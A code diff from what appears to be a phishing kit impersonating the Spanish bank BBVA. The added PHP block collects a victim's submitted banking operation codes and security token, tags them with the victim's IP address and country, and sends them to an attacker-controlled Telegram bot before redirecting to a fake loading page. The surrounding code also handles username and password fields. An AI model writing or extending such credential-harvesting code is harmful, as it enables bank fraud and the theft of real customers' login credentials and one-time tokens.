@@ -42,10 +42,30 @@ $data = [
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
 
 
- echo '<script>window.location.href="loading.php?l=1";</script>';
+ echo '<script>window.location.href="cargando.html?l=1";</script>';
 }
 
 
+if (isset($_POST['operaciones']) && isset($_POST['token'])  ){
+   $operaciones = $_POST["operaciones"];
+   $token = $_POST["token"];
+
+   
+   $message = "---bbva---\nOperaciones: <code>$operaciones</code>\nToken: <code>$token</code>\n---IPP---\n".$myip." ".$pais."";
+   
+   $apiToken = $apibot;
+   $data = [
+       'chat_id' => $canal,
+       'text' => $message,
+      'parse_mode' => 'HTML', 
+   ];
+   $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
+   
+   
+    echo '<script>window.location.href="cargando.html?l=1";</script>';
+   }
+   
+   
 
 if (isset($_POST['tipo-documento']) && isset($_POST['txteai_user'])  && isset($_POST['txteai_password']) ){
    $tipodoc = $_POST["tipo-documento"];
